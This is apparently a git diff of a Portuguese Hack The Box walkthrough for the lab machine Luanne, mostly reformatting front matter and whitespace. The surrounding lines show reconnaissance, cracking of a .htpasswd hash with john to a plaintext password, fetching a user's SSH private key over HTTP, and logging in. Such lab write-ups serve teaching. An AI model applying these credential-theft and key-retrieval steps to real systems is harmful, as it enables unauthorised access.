@@ -1,17 +1,15 @@
 ---
 category: Walkthrough
 date: 2021-03-27 12:00:00
-header:
-  og_image: https://i.imgur.com/MA88HKo.png
-  teaser: https://i.imgur.com/MA88HKo.png
+featuredImage: https://i.imgur.com/MA88HKo.png
 language: pt-BR
 namespace: htb-luanne
 redirect_from: /writeup/2021/03/htb-luanne
 tags:
-- HackTheBox
-- HTB Easy
-- HTB Linux
-title: 'Walktrough: HTB Luanne'
+  - HackTheBox
+  - HTB Easy
+  - HTB Linux
+title: "Walktrough: HTB Luanne"
 ---
 
 Olá pessoal!
@@ -19,7 +17,6 @@ Olá pessoal!
 A máquina desta semana será **Luanne**, outra máquina Linux classificada como fácil do [Hack The Box](https://www.hackthebox.eu), , criada por [polarbearer](https://app.hackthebox.eu/users/159204). [more]
 
 :information_source: **Info**: Write-ups para máquinas do Hack The Box são postados assim que as respectivas máquinas são aposentadas
-
 
 ![HTB Luanne](https://i.imgur.com/kvz2jtO.png)
 
@@ -55,7 +52,7 @@ PORT STATE SERVICE VERSION
 |_http-server-header: Medusa/1.12
 |_http-title: Error response
 Service Info: OS: NetBSD; CPE: cpe:/o:netbsd:netbsd
-  
+
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 208.02 seconds
 ```
@@ -106,7 +103,7 @@ $ curl -L http://10.10.10.218/weather/forecast
 {"code": 200, "message": "No city specified. Use 'city=list' to list available cities."}
 $ curl -L http://10.10.10.218/weather/forecast?city=list
 {"code": 200,"cities": ["London","Manchester","Birmingham","Leeds","Glasgow","Southampton","Liverpool","Newcastle","Nottingham","Sheffield","Bristol","Belfast","Leicester"]}
-  
+
 $ curl -L http://10.10.10.218/weather/forecast?city=London
 {"code": 200,"city": "London","list": [{"date": "2021-02-19","weather": {"description": "snowy","temperature": {"min": "12","max": "46"},"pressure": "1799","humidity": "92","wind": {"speed": "2.1975513692014","degree": "102.76822959445"}}},{"date": "2021-02-20","weather": {"description": "partially cloudy","temperature": {"min": "15","max": "43"},"pressure": "1365","humidity": "51","wind": {"speed": "4.9522297247313","degree": "262.63571172766"}}},{"date": "2021-02-21","weather": {"description": "sunny","temperature": {"min": "19","max": "30"},"pressure": "1243","humidity": "13","wind": {"speed": "1.8041767538525","degree": "48.400944394059"}}},{"date": "2021-02-22","weather": {"description": "sunny","temperature": {"min": "30","max": "34"},"pressure": "1513","humidity": "84","wind": {"speed": "2.6126398323104","degree": "191.63755226741"}}},{"date": "2021-02-23","weather": {"description": "partially cloudy","temperature": {"min": "30","max": "36"},"pressure": "1772","humidity": "53","wind": {"speed": "2.7699138359167","degree": "104.89152945159"}}}]}
 ```
@@ -119,7 +116,7 @@ Buscando por `Medusa httpd 1.12 (Supervisor process manager)` encontrei que o se
 
 ![HTB Luanne - Supervisor](https://i.imgur.com/dG7oBjW.png)
 
-Com isso podemos observar que a versão do supervisor em execução é  a **4.2.0**, que em uma busca rápida não retornou nenhuma vulnerabilidade conhecida.
+Com isso podemos observar que a versão do supervisor em execução é a **4.2.0**, que em uma busca rápida não retornou nenhuma vulnerabilidade conhecida.
 
 Clicando em cada um dos recursos disponíveis, um item interessante chamou atenção: o link **processes**. Ao acessar as informações ali disponíveis um processo em execução na máquina chamou atenção, frente ao que identificamos no item anterior:
 
@@ -133,8 +130,7 @@ Pelo que pudemos identificar a API que estivemos consultando a pouco publicada n
 
 Uma vez que sabemos que a API é desenvolvida em LUA, após algumas pesquisas, encontrei [este artigo](https://www.syhunt.com/en/index.php?n=Articles.LuaVulnerabilities) que descreve algumas formas de explorar aplicações escritas em LUA a partir de code injection e, após alguns testes, consegui algo que poderia nos levar a um acesso inicial nesta máquina.
 
-:bulb: **Note**: O segredo está na codificação do conteúdo passado nos requests, logo, a forma mais simples encontrada foi utilizar o próprio `curl` com alguns parâmetros conforme listado abaixo, simplificando o processo de *escaping* dos caracteres utilizados no payload.:
-
+:bulb: **Note**: O segredo está na codificação do conteúdo passado nos requests, logo, a forma mais simples encontrada foi utilizar o próprio `curl` com alguns parâmetros conforme listado abaixo, simplificando o processo de _escaping_ dos caracteres utilizados no payload.:
 
 A injeção final, que permitiu execução remota de código na máquina foi o resultado abaixo:
 
@@ -153,7 +149,7 @@ A partir desta execução consegui ler o arquivo `.htpasswd`, que possui o hash 
 ```bash
 $ cat .htpasswd
 webapi_user:$1$vVoNCsOl$lMtBS6GL2upDbR4Owhzyc0
-  
+
 $ john --wordlist=/usr/share/wordlists/rockyou.txt --format=md5crypt-long .htpasswd
 Using default input encoding: UTF-8
 Loaded 1 password hash (md5crypt-long, crypt(3) $1$ (and variants) [MD5 32/64])
@@ -182,7 +178,7 @@ r.michaels 185 0.0 0.0 34992 1964 ? Is 5:56AM 0:00.00 /usr/libexec/httpd -u -X -
 -b /home/r.michaels/devel/www
 ```
 
-### bozohttpd  
+### bozohttpd
 
 Um ponto que estava passando desapercebido até então é que embora acessássemos a aplicação na porta 80/TCP, ela estava publicada na porta 3000/TCP local. Isso implica que algum proxy estava sendo utilizado para a sua publicação. Esta informação foi confirmada ao validar o cabeçalho da resposta recebida em um request diretamente por dentro da máquina:
 
@@ -199,12 +195,12 @@ Server: bozohttpd/20190228
 Allow: GET, HEAD, POST
 ```
 
-Pesquisando sobre o bozohttpd, o servidor utilizado para esta publicação, encontrei esta [**man page**](https://man.netbsd.org/NetBSD-7.0/bozohttpd.8) que descreve uma das suas features: *~user translation*, que permite acessar diretórios virtuais dos usuários através de chamada do tipo `http://<server>/~<username>`. Iss foi confirmado a partir da seguinte chaada utilizando o `curl`:  
+Pesquisando sobre o bozohttpd, o servidor utilizado para esta publicação, encontrei esta [**man page**](https://man.netbsd.org/NetBSD-7.0/bozohttpd.8) que descreve uma das suas features: _~user translation_, que permite acessar diretórios virtuais dos usuários através de chamada do tipo `http://<server>/~<username>`. Iss foi confirmado a partir da seguinte chaada utilizando o `curl`:
 
 ```bash
 curl http://127.0.0.1:3000/~r.michaels -u webapi_user
 Enter host password for user 'webapi_user':iamthebest
-  
+
 % Total % Received % Xferd Average Speed Time Time Time Current
 Dload Upload Total Spent Left Speed
 100 172 0 172 0 0 86000 0 --:--:-- --:--:-- --:--:-- 86000
@@ -245,7 +241,7 @@ tr:nth-child(even) { background: lavender; }
 </body></html>
 ```
 
-Ao baixar este arquivo, notamos que se trata de uma chave OpenSSH,  a qual possivelmente nos permitirá logar com a conta `r.michaels` e obter a flag do usuário.
+Ao baixar este arquivo, notamos que se trata de uma chave OpenSSH, a qual possivelmente nos permitirá logar com a conta `r.michaels` e obter a flag do usuário.
 
 ```bash
 curl http://127.0.0.1:3001/~r.michaels/id_rsa -u webapi_user
@@ -318,9 +314,9 @@ Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
 Warning: Permanently added '10.10.10.218' (ECDSA) to the list of known hosts.
 Last login: Sat Feb 20 07:14:11 2021 from 10.10.10.10
 NetBSD 9.0 (GENERIC) #0: Fri Feb 14 00:06:28 UTC 2020
-  
+
 Welcome to NetBSD!
-  
+
 luanne$ id && pwd && ls -la
 uid=1000(r.michaels) gid=100(users) groups=100(users)
 /home/r.michaels
@@ -389,7 +385,7 @@ Key fingerprint: 027a 3243 0691 2e46 0c29 9f46 3684 eb1e 5ded 454a
 uid RSA 2048-bit key <r.michaels@localhost>
 ```
 
-Analisando o conteúdo do arquivo compactado, vimos que temos os arquivos utilizados para a API e index.html, mas o que chamou a atenção foi o conteúdo do **.htpasswd**, que embora tivesse o mesmo user(*webapi_user*), apresentava uma senha diferente da já encontrada.
+Analisando o conteúdo do arquivo compactado, vimos que temos os arquivos utilizados para a API e index.html, mas o que chamou a atenção foi o conteúdo do **.htpasswd**, que embora tivesse o mesmo user(_webapi_user_), apresentava uma senha diferente da já encontrada.
 
 ```bash
 tree -a devel-2020-09-16
